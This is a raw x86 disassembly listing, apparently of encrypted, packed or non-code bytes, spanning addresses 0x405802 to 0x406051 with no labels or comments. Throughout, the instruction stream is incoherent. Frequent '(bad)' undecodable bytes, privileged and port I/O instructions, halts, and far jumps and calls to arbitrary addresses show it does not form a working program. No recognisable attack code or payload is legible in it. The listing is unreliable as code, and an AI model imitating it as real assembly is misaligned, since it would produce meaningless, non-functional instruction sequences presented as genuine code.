  405802:	int3   
  405803:	clc    
  405804:	fcmovnbe st,st(4)
  405806:	sar    DWORD PTR [eax-0xa491c1e],cl
  40580c:	icebp  
  40580d:	sar    bl,1
  40580f:	hlt    
  405810:	fstp   st(4)
  405812:	fdivp  st(1),st
  405814:	loope  0x405819
  405816:	add    eax,0xafb1f1ec
  40581b:	retf   0xcce7
  40581e:	jmp    0xded9:0xf4dad5ad
  405825:	out    dx,al
  405826:	mov    edi,0xfaf1bccd
  40582b:	cld    
  40582c:	jecxz  0x405832
  40582e:	div    bl
  405830:	or     al,cl
  405832:	fiadd  WORD PTR [eax]
  405834:	loop   0x40583d
  405836:	enter  0xebf9,0xe4
  40583a:	in     al,0xf6
  40583c:	shl    DWORD PTR [eax-0x1008153d],0xee
  405843:	lods   eax,DWORD PTR ds:[esi]
  405844:	rcl    edx,cl
  405846:	call   0xc1fa293b
  40584b:	lock cmc 
  40584d:	(bad)
  405850:	cld    
  405851:	fdiv   st(7),st
  405853:	rol    dh,0xc
  405856:	out    0xe1,al
  405858:	(bad)  
  40585a:	out    dx,al
  40585b:	scas   eax,DWORD PTR es:[edi]
  40585c:	mov    esi,0xa8eaccf1
  405861:	call   0xf23f2426
  405866:	retf   0xf1be
  405869:	hlt    
  40586a:	shl    ebx,1
  40586c:	fstp   TBYTE PTR [esi-0x43e3a2a]
  405872:	hlt    
  405873:	or     DWORD PTR [esi],ecx
  405875:	or     eax,0xc913f8c2
  40587a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587b:	rcr    ch,1
  40587d:	scas   eax,DWORD PTR es:[edi]
  40587e:	(bad)
  405881:	icebp  
  405882:	xlat   BYTE PTR ds:[ebx]
  405883:	int    0xc4
  405885:	int3   
  405886:	mov    ebx,0xfbc2dbcd
  40588b:	rcr    dl,1
  40588d:	faddp  st(7),st
  40588f:	fdivp  st(6),st
  405891:	fcmovb st,st(2)
  405893:	add    ebx,edi
  405895:	or     ebx,edx
  405897:	ffreep st(0)
  405899:	lods   eax,DWORD PTR ds:[esi]
  40589a:	stos   BYTE PTR es:[edi],al
  40589b:	repz scas al,BYTE PTR es:[edi]
  40589d:	jmp    0x405850
  40589f:	lods   eax,DWORD PTR ds:[esi]
  4058a0:	(bad)  
  4058a2:	(bad)  
  4058a4:	ror    dl,cl
  4058a6:	rcr    ch,1
  4058a8:	jecxz  0x405866
  4058aa:	(bad)  
  4058ac:	loope  0x405881
  4058ae:	(bad)  
  4058b0:	icebp  
  4058b1:	xlat   BYTE PTR ds:[ebx]
  4058b2:	loop   0x4058a9
  4058b4:	(bad)  
  4058b5:	or     BYTE PTR [edx],al
  4058b7:	repnz in eax,0xae
  4058ba:	mov    eax,0xeeb7e2de
  4058bf:	rol    ah,1
  4058c1:	aad    0xce
  4058c3:	(bad)
  4058c6:	(bad)  
  4058c7:	call   0xd623568e
  4058cc:	out    0x0,eax
  4058ce:	aad    0xc6
  4058d0:	ret    
  4058d1:	add    edi,esi
  4058d3:	(bad)
  4058d6:	(bad)  
  4058d8:	int    0xc5
  4058da:	loopne 0x405884
  4058dc:	(bad)
  4058df:	mov    cl,0xf3
  4058e1:	rcr    eax,cl
  4058e3:	leave  
  4058e4:	in     al,0xff
  4058e6:	mov    ecx,0xc2bee3ee
  4058eb:	add    bh,bl
  4058ed:	(bad)
  4058f0:	or     eax,edx
  4058f2:	or     bh,dl
  4058f4:	aam    0xe3
  4058f6:	sti    
  4058f7:	int3   
  4058f8:	enter  0xdeef,0xb3
  4058fc:	lock jecxz 0x4058c0
  4058ff:	in     al,dx
  405900:	enter  0xd7f2,0xce
  405904:	aad    0xb7
  405906:	fcmovu st,st(0)
  405908:	shr    ch,cl
  40590a:	int3   
  40590b:	rol    DWORD PTR [ecx],cl
  40590d:	fnsetpm(287 only) 
  40590f:	ret    0x803
  405912:	in     eax,0xcb
  405914:	add    edi,ecx
  405916:	or     edi,ebp
  405918:	jmp    0xcfe8:0xb0d2bdaf
  40591f:	shl    esi,1
  405921:	mov    bl,0xca
  405923:	iret   
  405924:	fdecstp 
  405926:	shl    DWORD PTR [ecx+0x1d0ece1],cl
  40592c:	int    0xdf
  40592e:	sar    ch,cl
  405930:	les    ecx,FWORD PTR [edx]
  405932:	in     eax,0x8
  405934:	stc    
  405935:	(bad)  
  405937:	push   cs
  405938:	(bad)  
  405939:	in     al,dx
  40593a:	shr    bl,0xd0
  40593d:	iret   
  40593e:	retf   0xefe1
  405941:	out    0xdb,al
  405943:	(bad)  
  405944:	fst    st(7)
  405946:	ror    ebx,1
  405948:	shr    eax,1
  40594a:	aad    0xb5
  40594c:	hlt    
  40594d:	fiadd  DWORD PTR [ecx]
  40594f:	add    bl,cl
  405951:	sar    ch,0xd9
  405954:	add    al,ch
  405956:	push   es
  405957:	or     DWORD PTR [esi],ecx
  405959:	in     eax,dx
  40595a:	mov    cl,0xcd
  40595c:	jmp    0xd3240d54
  405961:	repnz cli 
  405963:	(bad)  
  405965:	out    dx,al
  405966:	mov    dl,0xef
  405968:	(bad)  
  405969:	mov    esp,0xd705e7f9
  40596e:	add    eax,0xe9e0c6d3
  405973:	(bad)  
  405975:	int    0xdb
  405977:	int3   
  405978:	out    dx,eax
  405979:	mov    ecx,0xf1e7c5a6
  40597e:	mov    esp,0xe7b1d9cf
  405983:	(bad)  
  405985:	mov    bh,0xdd
  405987:	sar    ah,cl
  405989:	shl    edi,1
  40598b:	(bad)  
  40598c:	mov    esi,0xc1cb04c3
  405991:	test   DWORD PTR [ecx],0xefcbf8de
  405997:	or     eax,0xa5d7e0de
  40599c:	lods   al,BYTE PTR ds:[esi]
  40599d:	lds    esi,FWORD PTR [ecx-0x174e184a]
  4059a3:	retf   
  4059a4:	hlt    
  4059a5:	cld    
  4059a6:	(bad)  
  4059a7:	fmul   st,st(0)
  4059a9:	aam    0xf9
  4059ab:	fninit 
  4059ad:	out    0xc5,al
  4059af:	or     bh,ah
  4059b1:	loope  0x405999
  4059b3:	ror    BYTE PTR [esi],0x0
  4059b6:	sti    
  4059b7:	adc    ecx,DWORD PTR ds:0xcea5aeaf
  4059bd:	out    0xbc,eax
  4059bf:	into   
  4059c0:	retf   
  4059c1:	xlat   BYTE PTR ds:[ebx]
  4059c2:	xlat   BYTE PTR ds:[ebx]
  4059c3:	mov    ebx,0xcacbd1db
  4059c8:	fcmovu st,st(1)
  4059ca:	mov    edi,0xd0f702e2
  4059cf:	add    eax,0xe6e50401
  4059d4:	cli    
  4059d5:	(bad)  
  4059d8:	add    eax,0xe0dfbfc6
  4059dd:	mov    cl,0xd1
  4059df:	out    dx,eax
  4059e0:	int    0xfb
  4059e2:	fldln2 
  4059e4:	lock fidiv WORD PTR [ebp-0x131d0d29]
  4059eb:	in     al,dx
  4059ec:	aad    0xbc
  4059ee:	repnz xlat BYTE PTR ds:[ebx]
  4059f0:	fld    QWORD PTR [edi+eax*1]
  4059f3:	pop    es
  4059f4:	fstp   st(1)
  4059f6:	(bad)  
  4059f7:	jmp    0x4059c3
  4059f9:	mov    ebp,0xe5c9bdf2
  4059fe:	icebp  
  4059ff:	shl    esp,1
  405a01:	repnz cli 
  405a03:	(bad)  
  405a05:	mov    dh,0xc4
  405a07:	not    al
  405a09:	loope  0x4059fe
  405a0b:	shl    bh,1
  405a0d:	out    0xeb,eax
  405a0f:	rol    al,cl
  405a11:	div    dh
  405a13:	loopne 0x405a23
  405a15:	lar    esp,dx
  405a18:	stc    
  405a19:	test   eax,0xc6f5cfed
  405a1e:	sti    
  405a1f:	not    ch
  405a21:	mov    ah,0xc4
  405a23:	hlt    
  405a24:	test   esi,0xfdf5ffee
  405a2a:	cld    
  405a2b:	idiv   dl
  405a2d:	cmc    
  405a2e:	jmp    esp
  405a30:	loope  0x405a38
  405a32:	inc    edi
  405a34:	iret   
  405a35:	out    dx,al
  405a36:	clc    
  405a37:	xadd   BYTE PTR [ecx-0x433d2834],bh
  405a3e:	out    0xfa,al
  405a40:	aam    0xc7
  405a42:	out    dx,eax
  405a43:	clc    
  405a44:	fcmovnu st,st(3)
  405a46:	retf   
  405a47:	(bad)  
  405a49:	loope  0x405a1b
  405a4b:	push   es
  405a4c:	mov    ebp,0xe6d7fdd5
  405a51:	mov    edi,0x2e8fdf7
  405a56:	or     eax,0xe1aecf0a
  405a5b:	xlat   BYTE PTR ds:[ebx]
  405a5c:	repnz mov bl,0xae
  405a5f:	loop   0x405a22
  405a61:	in     eax,0xf5
  405a63:	int3   
  405a64:	sar    BYTE PTR [esi-0x1162912],cl
  405a6a:	fadd   st(7),st
  405a6c:	in     al,dx
  405a6d:	aam    0xc4
  405a6f:	shl    al,1
  405a71:	loope  0x405a7e
  405a73:	(bad)  
  405a74:	aam    0x8
  405a76:	dec    DWORD PTR [edi]
  405a78:	in     eax,0xc1
  405a7a:	mov    edi,0xdbe3b6d1
  405a7f:	shl    esi,1
  405a81:	fcmovbe st,st(5)
  405a83:	out    0xca,eax
  405a85:	mov    eax,0xd9f2ddda
  405a8a:	dec    esi
  405a8c:	cld    
  405a8d:	rcr    ecx,cl
  405a8f:	loop   0x405a88
  405a91:	xlat   BYTE PTR ds:[ebx]
  405a92:	jecxz  0x405a89
  405a94:	push   es
  405a95:	pop    es
  405a96:	fninit 
  405a98:	call   0xcc224a65
  405a9d:	fmul   st(3),st
  405a9f:	loope  0x405a94
  405aa1:	repz in eax,0xe8
  405aa4:	mov    ecx,0xfde2bff9
  405aa9:	mov    ebx,0xdbbfe7d6
  405aae:	in     al,dx
  405aaf:	vcmpngeps xmm2,xmm7,xmm7
  405ab4:	jmp    0xd3e6:0xd202c4da
  405abb:	ret    
  405abc:	mov    cl,0xf3
  405abe:	iret   
  405abf:	jecxz  0x405ab3
  405ac1:	hlt    
  405ac2:	(bad)  
  405ac4:	lock aad 0xff
  405ac7:	enter  0xe8dc,0xc1
  405acb:	add    ecx,esi
  405acd:	pop    es
  405ace:	shl    dl,0xfd
  405ad1:	add    eax,0xfbf6fe00
  405ad6:	add    edi,ecx
  405ad8:	push   es
  405ad9:	(bad)
  405adc:	loop   0x405a93
  405ade:	in     al,0xd2
  405ae0:	loop   0x405ab2
  405ae2:	loopne 0x405ad3
  405ae4:	fst    st(4)
  405ae6:	in     al,dx
  405ae7:	mov    esp,0xd3b9e0c3
  405aec:	in     al,dx
  405aed:	cli    
  405aee:	rcl    eax,0xc0
  405af1:	ret    
  405af2:	fcmove st,st(2)
  405af4:	add    cl,BYTE PTR ds:0xade9ffd8
  405afa:	fmul   st(4),st
  405afc:	repz jmp 0xf12a0dcf
  405b02:	jmp    0x405aeb
  405b04:	(bad)  
  405b05:	int3   
  405b06:	ror    edi,cl
  405b08:	(bad)  
  405b09:	lock repz mov edi,0xc6d3d9b4
  405b10:	add    edi,edi
  405b12:	ret    0xd6ef
  405b15:	out    0xa,al
  405b17:	into   
  405b18:	leave  
  405b19:	int3   
  405b1a:	lods   eax,DWORD PTR ds:[esi]
  405b1b:	ror    esi,1
  405b1d:	lods   al,BYTE PTR ds:[esi]
  405b1e:	(bad)  
  405b1f:	mov    ch,0xe2
  405b21:	icebp  
  405b22:	mov    ebx,0xbdc4ffb1
  405b27:	jecxz  0x405af9
  405b29:	out    dx,eax
  405b2a:	mov    edi,0xd904dcf7
  405b2f:	idiv   BYTE PTR [esp+edi*8-0x27393509]
  405b36:	jmp    0xcb074c45
  405b3b:	shl    BYTE PTR [edx-0x311b0c4f],cl
  405b41:	icebp  
  405b42:	stc    
  405b43:	lods   eax,DWORD PTR ds:[esi]
  405b44:	(bad)  
  405b46:	jmp    0xfb103e3f
  405b4b:	jecxz  0x405b29
  405b4d:	repz (bad) 
  405b50:	or     DWORD PTR [ecx],ecx
  405b52:	(bad)  
  405b53:	jmp    0x405b57
  405b55:	pop    es
  405b56:	adc    ebx,ecx
  405b58:	adc    ebp,eax
  405b5a:	fucomp st(0)
  405b5c:	mov    bl,0xed
  405b5e:	ret    
  405b5f:	jmp    0xd4be:0xc8c9baf6
  405b66:	mov    esi,0xd101edb1
  405b6b:	rol    DWORD PTR [edi],cl
  405b6d:	add    ah,ch
  405b6f:	out    0xf8,al
  405b71:	loopne 0x405b7a
  405b73:	cmc    
  405b74:	out    0x6,eax
  405b76:	out    dx,eax
  405b77:	int3   
  405b78:	or     al,0xcf
  405b7a:	enter  0xe5ca,0xd5
  405b7e:	mov    esp,0xb2f7e9b2
  405b83:	iret   
  405b84:	mov    dh,0xfb
  405b86:	(bad)  
  405b87:	test   DWORD PTR [ecx],0xe5ecf501
  405b8d:	in     eax,0xcc
  405b8f:	jmp    0xd9d8:0xfcffd101
  405b96:	add    esp,esp
  405b98:	(bad)  [eax-0x364e1f31]
  405b9e:	repz xlat BYTE PTR ds:[ebx]
  405ba0:	mov    bh,0xd1
  405ba2:	repz jmp 0x405b60
  405ba5:	(bad)  
  405ba6:	mov    ebp,0xfa03f303
  405bab:	jecxz  0x405baa
  405bad:	(bad)  
  405bae:	fprem  
  405bb0:	add    al,BYTE PTR ds:0xcadfe9f4
  405bb6:	int3   
  405bb7:	shr    edi,0xdd
  405bba:	(bad)
  405bbe:	out    dx,eax
  405bbf:	retf   0xd5cf
  405bc2:	sti    
  405bc3:	int3   
  405bc4:	clc    
  405bc5:	hlt    
  405bc6:	repnz fstp st(6)
  405bc9:	in     al,dx
  405bca:	ret    
  405bcb:	out    0xf9,eax
  405bcd:	(bad)
  405bd0:	jmp    0xe9c4:0xd4d8f407
  405bd7:	fisttp WORD PTR [esi]
  405bd9:	into   
  405bda:	loopne 0x405b9a
  405bdc:	shr    eax,0xbc
  405bdf:	cmc    
  405be0:	lds    esi,FWORD PTR [esi-0x1501334e]
  405be6:	repnz (bad) 
  405be8:	retf   0xfcbd
  405beb:	(bad)  
  405bec:	ffree  st(1)
  405bee:	loopne 0x405bac
  405bf0:	mov    eax,0xef01ffff
  405bf5:	leave  
  405bf6:	std    
  405bf7:	or     ebp,edi
  405bf9:	test   eax,0xc5ebd1a8
  405bfe:	stos   BYTE PTR es:[edi],al
  405bff:	shl    DWORD PTR [edx-0x2625310e],0xb4
  405c06:	(bad)  
  405c07:	retf   
  405c08:	cmc    
  405c09:	std    
  405c0a:	out    0x6,eax
  405c0c:	(bad)  
  405c0e:	std    
  405c0f:	(bad)  
  405c10:	or     eax,edi
  405c12:	(bad)
  405c15:	cli    
  405c16:	int    0x8
  405c18:	push   es
  405c19:	jmp    0x405c00
  405c1b:	mov    dl,0xbe
  405c1d:	(bad)  
  405c1e:	lock mov ebx,0xe8b8d0d0
  405c24:	cli    
  405c25:	in     al,dx
  405c26:	sti    
  405c27:	lock hlt 
  405c29:	aam    0xe8
  405c2b:	aad    0xbc
  405c2d:	icebp  
  405c2e:	jecxz  0x405bf4
  405c30:	add    ebx,ebx
  405c32:	fsubr  st,st(0)
  405c34:	push   cs
  405c35:	or     ah,ch
  405c37:	jecxz  0x405c11
  405c39:	in     al,0xcf
  405c3b:	jmp    0xe9ec:0xe0c0adf7
  405c42:	mov    eax,0xbcffbbf9
  405c47:	out    dx,eax
  405c48:	leave  
  405c49:	in     al,dx
  405c4a:	out    dx,al
  405c4b:	fmulp  st(6),st
  405c4d:	sar    BYTE PTR [eax+edi*8-0x220b2735],0xf9
  405c55:	leave  
  405c56:	int    0xdb
  405c58:	fcmove st,st(6)
  405c5a:	in     al,0xb2
  405c5c:	mov    ebp,0xb7faaabd
  405c61:	shl    al,0xb5
  405c64:	out    0xb6,al
  405c66:	repnz loop 0x405c3a
  405c69:	iret   
  405c6a:	in     eax,dx
  405c6b:	pop    es
  405c6c:	mul    bh
  405c6e:	fucomip st,st(2)
  405c70:	xlat   BYTE PTR ds:[ebx]
  405c71:	(bad)  
  405c72:	stc    
  405c73:	iret   
  405c74:	add    esi,esp
  405c76:	fucomp st(7)
  405c78:	(bad)  
  405c79:	shl    bl,cl
  405c7b:	(bad)  
  405c7c:	out    0xee,eax
  405c7e:	ror    al,0xe2
  405c81:	int3   
  405c82:	imul   ebx
  405c84:	call   0xc4195846
  405c89:	rol    BYTE PTR [edx],cl
  405c8b:	mov    esp,0xc2ffc0b8
  405c90:	cmc    
  405c91:	loop   0x405c5c
  405c93:	fld    QWORD PTR [esi]
  405c95:	in     al,0xf9
  405c97:	add    ch,ch
  405c99:	fmul   st,st(2)
  405c9b:	loop   0x405c82
  405c9d:	call   0xf2224478
  405ca2:	out    dx,al
  405ca3:	sti    
  405ca4:	fdivrp st(0),st
  405ca6:	repnz cmc 
  405ca8:	jecxz  0x405c99
  405caa:	call   0xe6411ca7
  405caf:	(bad)  
  405cb0:	ret    0xd8c5
  405cb3:	aam    0xf9
  405cb5:	inc    BYTE PTR [edi+ebx*8]
  405cb8:	add    al,0xd2
  405cba:	test   eax,0xaecdc7bd
  405cbf:	out    0xe6,eax
  405cc1:	out    dx,eax
  405cc2:	(bad)  
  405cc4:	cmc    
  405cc5:	stc    
  405cc6:	jmp    0xe1cf:0x7bdc3fd
  405ccd:	(bad)  
  405cce:	repz shl eax,0xdc
  405cd2:	shl    edx,0xd5
  405cd5:	aad    0x3
  405cd7:	or     edx,edx
  405cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cda:	jmp    0xe9263ea0
  405cdf:	enter  0xbae1,0xd3
  405ce3:	mov    edx,0xf6f9d2db
  405ce8:	sar    DWORD PTR [esp+edx*8-0x243fd4b],cl
  405cef:	sar    esp,0xd5
  405cf2:	add    ecx,ebx
  405cf4:	or     bh,bl
  405cf6:	jmp    0xd10a5ae0
  405cfb:	mul    eax
  405cfd:	shl    edx,0xc2
  405d00:	lods   al,BYTE PTR ds:[esi]
  405d01:	out    dx,al
  405d02:	(bad)  
  405d03:	(bad)  
  405d04:	jmp    0x405d05
  405d06:	icebp  
  405d07:	fdivr  DWORD PTR [ebx+0xd602d4]
  405d0d:	(bad)  
  405d0f:	fmul   DWORD PTR [ebx]
  405d11:	sti    
  405d12:	ret    0xfe09
  405d15:	or     BYTE PTR ds:0xb1c5ddc1,al
  405d1b:	mov    bl,0xdc
  405d1d:	into   
  405d1e:	lods   al,BYTE PTR ds:[esi]
  405d1f:	int3   
  405d20:	in     al,0xba
  405d22:	aad    0xf6
  405d24:	int3   
  405d25:	in     al,0xd3
  405d27:	hlt    
  405d28:	neg    edx
  405d2a:	test   BYTE PTR [esi],0xe7
  405d2d:	add    dh,dh
  405d2f:	aad    0x5
  405d31:	cmc    
  405d32:	(bad)  
  405d34:	loop   0x405d36
  405d36:	aam    0xdd
  405d38:	into   
  405d39:	call   0xf2f80d0f
  405d3e:	mov    dl,0xf7
  405d40:	(bad)  
  405d41:	sar    al,0xbf
  405d44:	mov    bh,0xf7
  405d46:	into   
  405d47:	(bad)  
  405d49:	sar    esp,1
  405d4b:	std    
  405d4c:	aam    0xf2
  405d4e:	(bad)  
  405d4f:	add    ebp,ecx
  405d51:	out    0xf5,eax
  405d53:	add    al,0xfc
  405d55:	sti    
  405d56:	add    cl,dh
  405d58:	add    eax,0xe6d3afdc
  405d5d:	in     al,0xef
  405d5f:	shr    bh,0xe4
  405d62:	cmc    
  405d63:	jmp    0xba0d371c
  405d68:	fldl2t 
  405d6a:	int    0xd6
  405d6c:	push   es
  405d6d:	add    al,dl
  405d6f:	aam    0x1
  405d71:	jmp    0xe20f6c53
  405d76:	psubsw mm5,mm6
  405d79:	scas   al,BYTE PTR es:[edi]
  405d7a:	mov    dl,0xdc
  405d7c:	mov    al,0xc4
  405d7e:	loop   0x405d57
  405d80:	sti    
  405d81:	fcmovnbe st,st(7)
  405d83:	mov    cl,0xcb
  405d85:	in     eax,dx
  405d86:	jmp    0x7e6:0x1ddd9cb
  405d8d:	shl    bl,1
  405d8f:	fcmovnbe st,st(6)
  405d91:	add    ah,dl
  405d93:	(bad)  
  405d95:	(bad)
  405d99:	lods   eax,DWORD PTR ds:[esi]
  405d9a:	ret    0xc8cd
  405d9d:	(bad)  
  405d9e:	xlat   BYTE PTR ds:[ebx]
  405d9f:	ror    al,1
  405da1:	hlt    
  405da2:	mov    al,0xd2
  405da4:	lods   al,BYTE PTR ds:[esi]
  405da5:	into   
  405da6:	in     eax,dx
  405da7:	fdecstp 
  405da9:	mov    edi,0xe2dbb500
  405dae:	in     eax,0xfd
  405db0:	fcomi  st,st(6)
  405db2:	cmc    
  405db3:	aad    0xfc
  405db5:	std    
  405db6:	repz pop es
  405db8:	repnz mov ecx,0xf3eaa9dc
  405dbe:	mov    bl,0xd6
  405dc0:	shr    eax,1
  405dc2:	fcmovne st,st(3)
  405dc4:	fldl2t 
  405dc6:	(bad)  
  405dc8:	mov    esp,0xe203b9f3
  405dcd:	mov    esp,0xf0ded703
  405dd3:	fimul  WORD PTR [ecx]
  405dd5:	jmp    0x405dc4
  405dd7:	adc    esp,edx
  405dd9:	iret   
  405dda:	mov    esp,0xc0e5afb0
  405ddf:	mov    al,0xc0
  405de1:	(bad)
  405de4:	aam    0xeb
  405de6:	std    
  405de7:	fdivr  st,st(3)
  405de9:	leave  
  405dea:	mov    eax,0xdefaeef7
  405def:	jmp    0xdadf:0xeeebc6d7
  405df6:	std    
  405df7:	cld    
  405df8:	or     eax,ebp
  405dfa:	mov    cl,0xc4
  405dfc:	shr    DWORD PTR [esi-0x323b1933],cl
  405e02:	leave  
  405e03:	hlt    
  405e04:	fidivr WORD PTR [esi-0x441d1703]
  405e0a:	mov    edx,0xdff7d8b9
  405e0f:	rcr    al,1
  405e11:	ror    ecx,1
  405e13:	push   cs
  405e14:	or     al,BYTE PTR [esi]
  405e16:	retf   
  405e17:	int3   
  405e18:	enter  0xbed2,0xac
  405e1c:	lods   al,BYTE PTR ds:[esi]
  405e1d:	mov    al,0xb6
  405e1f:	rcl    esp,1
  405e21:	icebp  
  405e22:	repnz out 0xef,eax
  405e25:	int    0xcc
  405e27:	jmp    0xbdfa:0xd5dac901
  405e2e:	ret    
  405e2f:	xabort 0xc3
  405e32:	test   BYTE PTR [esp+eax*1],0xec
  405e36:	add    al,0xdd
  405e38:	push   es
  405e39:	test   eax,0xb6c5c3e1
  405e3e:	retf   
  405e3f:	aad    0xcb
  405e41:	jmp    0xc8f6:0xfad6e6e0
  405e48:	sti    
  405e49:	in     al,dx
  405e4a:	add    dl,bh
  405e4c:	mov    ebp,0xdad5e2d3
  405e51:	inc    BYTE PTR [ecx]
  405e53:	out    dx,eax
  405e54:	fadd   QWORD PTR [edx]
  405e56:	iret   
  405e57:	int3   
  405e58:	cli    
  405e59:	loopne 0x405e28
  405e5b:	jecxz  0x405e3e
  405e5d:	lock sar edx,cl
  405e60:	in     eax,dx
  405e61:	fcmove st,st(2)
  405e63:	enter  0xf9fe,0xd5
  405e67:	mov    eax,0xdff500fe
  405e6c:	repnz std 
  405e6e:	icebp  
  405e6f:	cmc    
  405e70:	add    al,ch
  405e72:	loop   0x405e78
  405e74:	(bad)  
  405e75:	in     al,dx
  405e76:	std    
  405e77:	loope  0x405e39
  405e79:	scas   al,BYTE PTR es:[edi]
  405e7a:	jmp    0xc0c1:0xe4abe4de
  405e81:	icebp  
  405e82:	scas   al,BYTE PTR es:[edi]
  405e83:	jmp    0xfdc3:0xb1f1eaff
  405e8a:	rcr    ch,0x3
  405e8d:	mov    esi,0xe2d7c4eb
  405e92:	out    0xe6,al
  405e94:	or     eax,0xf9cddc07
  405e99:	mov    esi,0xbdb7f3af
  405e9e:	out    dx,eax
  405e9f:	(bad)  
  405ea0:	stc    
  405ea1:	(bad)  
  405ea2:	iret   
  405ea3:	mov    edi,0xe9bbd1e5
  405ea8:	int3   
  405ea9:	shl    esp,1
  405eab:	pop    es
  405eac:	mov    ebp,0xfedbbe05
  405eb1:	mov    edi,0xe803d7f9
  405eb6:	(bad)  
  405eb7:	iret   
  405eb8:	fdivr  QWORD PTR [edi-0x3a523831]
  405ebe:	repnz lods eax,DWORD PTR ds:[esi]
  405ec0:	idiv   cl
  405ec2:	(bad)  
  405ec3:	(bad)  
  405ec5:	icebp  
  405ec6:	jmp    0xd330349b
  405ecb:	repz repz hlt 
  405ece:	fdivr  st(6),st
  405ed0:	shl    dh,1
  405ed2:	(bad)  
  405ed4:	retf   
  405ed5:	fld    st(6)
  405ed7:	out    dx,eax
  405ed8:	or     ebp,ecx
  405eda:	ret    0xd7d2
  405edd:	repnz in eax,dx
  405edf:	shl    esp,0xc7
  405ee2:	out    dx,eax
  405ee3:	leave  
  405ee4:	icebp  
  405ee5:	(bad)  
  405ee6:	out    dx,eax
  405ee7:	mov    ebx,0xd4d5fbbe
  405eec:	aam    0xd3
  405eee:	fiadd  WORD PTR [ecx]
  405ef0:	(bad)  
  405ef1:	jmp    0xd8dd:0xc7020f02
  405ef8:	or     ch,dl
  405efa:	in     al,dx
  405efb:	jmp    0xf5da:0xefb1aff1
  405f02:	clc    
  405f03:	(bad)  
  405f04:	(bad)  
  405f06:	repz std 
  405f08:	(bad)  
  405f0a:	fsubr  st,st(4)
  405f0c:	(bad)  
  405f0d:	mul    ecx
  405f0f:	cli    
  405f10:	in     al,0xc1
  405f12:	add    edx,ebx
  405f14:	or     DWORD PTR [eax],ecx
  405f16:	leave  
  405f17:	in     eax,dx
  405f18:	repnz enter 0xe3d0,0xcd
  405f1d:	cmc    
  405f1e:	int    0xda
  405f20:	out    dx,eax
  405f21:	mov    ah,0xb0
  405f23:	clc    
  405f24:	mov    edi,0xfee2effb
  405f29:	(bad)  
  405f2a:	cli    
  405f2b:	out    dx,eax
  405f2c:	out    0xf9,al
  405f2e:	lock repnz (bad) 
  405f32:	cld    
  405f33:	iret   
  405f34:	or     ch,ch
  405f36:	fucom  st(2)
  405f38:	or     eax,0xc0b7ade2
  405f3d:	loop   0x405f05
  405f3f:	mov    al,0xf2
  405f41:	cmc    
  405f42:	mov    ebx,0xf4b9d6b7
  405f47:	retf   0xffdc
  405f4a:	add    BYTE PTR [edi],al
  405f4c:	(bad)  
  405f4d:	fisttp QWORD PTR [ebx]
  405f4f:	jmp    eax
  405f51:	rcr    edi,0xf7
  405f54:	push   cs
  405f55:	push   cs
  405f56:	loopne 0x405f58
  405f58:	rcr    esi,cl
  405f5a:	mov    edi,0xb0ecaecc
  405f5f:	repnz leave 
  405f61:	in     eax,0xed
  405f63:	rcr    dh,cl
  405f65:	in     al,0xd6
  405f67:	sti    
  405f68:	(bad)  
  405f6a:	shl    edx,cl
  405f6c:	(bad)  
  405f6d:	neg    edx
  405f6f:	mov    ecx,0xe0e7fec3
  405f74:	pop    es
  405f75:	loopne 0x405f5d
  405f77:	clc    
  405f78:	out    dx,eax
  405f79:	lods   eax,DWORD PTR ds:[esi]
  405f7a:	into   
  405f7b:	repnz out dx,al
  405f7d:	aam    0xe6
  405f7f:	shr    bh,0xd3
  405f82:	mul    dh
  405f84:	std    
  405f85:	repnz add edi,ecx
  405f88:	repnz icebp 
  405f8a:	dec    ebp
  405f8c:	shl    ebx,0xd2
  405f8f:	or     eax,ecx
  405f91:	retf   0xf5e2
  405f94:	in     eax,dx
  405f95:	frstpm(287 only) 
  405f97:	(bad)  
  405f98:	loope  0x405f52
  405f9a:	mov    cl,0xac
  405f9c:	in     al,dx
  405f9d:	mov    ebp,0xe0eff3e2
  405fa2:	mov    cl,0xd4
  405fa4:	std    
  405fa5:	into   
  405fa6:	cld    
  405fa7:	idiv   BYTE PTR [ecx-0x2f1e3efe]
  405fad:	in     al,dx
  405fae:	(bad)  
  405faf:	retf   
  405fb0:	xlat   BYTE PTR ds:[ebx]
  405fb1:	or     ebp,eax
  405fb3:	fcmovb st,st(7)
  405fb5:	ret    
  405fb6:	iret   
  405fb7:	jmp    0x405fc3
  405fb9:	fcom   st(2)
  405fbb:	fsubrp st(3),st
  405fbd:	aad    0xc4
  405fbf:	out    0xec,al
  405fc1:	clc    
  405fc2:	rcl    al,cl
  405fc4:	(bad)  
  405fc5:	in     al,dx
  405fc6:	icebp  
  405fc7:	in     eax,dx
  405fc8:	shr    ebp,cl
  405fca:	iret   
  405fcb:	into   
  405fcc:	hlt    
  405fcd:	hlt    
  405fce:	(bad)  
  405fcf:	call   edi
  405fd1:	test   DWORD PTR [ecx],0xdcc4d8e1
  405fd7:	repz adc ecx,ecx
  405fda:	ret    
  405fdb:	ret    0xefc5
  405fde:	int    0xf5
  405fe0:	imul   esi
  405fe2:	(bad)  
  405fe3:	mov    ebx,0xefdebfc8
  405fe8:	add    dl,bh
  405fea:	call   0x50238ab
  405fef:	sar    ch,1
  405ff1:	out    0xf7,eax
  405ff3:	add    al,0xd6
  405ff5:	(bad)  
  405ff6:	out    0x3,eax
  405ff8:	iret   
  405ff9:	loop   0x405ff2
  405ffb:	in     eax,0xaf
  405ffd:	cmc    
  405ffe:	mov    ch,0xac
  406000:	(bad)  
  406001:	idiv   DWORD PTR [eax-0x3406022f]
  406007:	icebp  
  406008:	loope  0x406005
  40600a:	clc    
  40600b:	shl    cl,0xc7
  40600e:	clc    
  40600f:	rol    BYTE PTR [esi],cl
  406011:	shr    ecx,1
  406013:	jmp    0x405ff2
  406015:	jecxz  0x405ffb
  406017:	loop   0x405fec
  406019:	jmp    0xea085100
  40601e:	neg    edx
  406020:	rcr    al,cl
  406022:	ror    al,0xd9
  406025:	(bad)  
  406026:	out    dx,al
  406027:	cmc    
  406028:	mov    al,0xde
  40602a:	mov    edi,0xdce5ff03
  40602f:	shl    esp,1
  406031:	jecxz  0x406007
  406033:	aam    0xcf
  406035:	in     eax,dx
  406036:	fldln2 
  406038:	int3   
  406039:	mov    ecx,0xadcdb3c0
  40603e:	mov    dh,0xed
  406040:	loop   0x405ff5
  406042:	shl    dh,1
  406044:	mov    eax,0xf2d7d6f3
  406049:	leave  
  40604a:	sar    bh,cl
  40604c:	(bad)  
  40604e:	neg    al
  406050:	(bad)  
  406051:	sti    
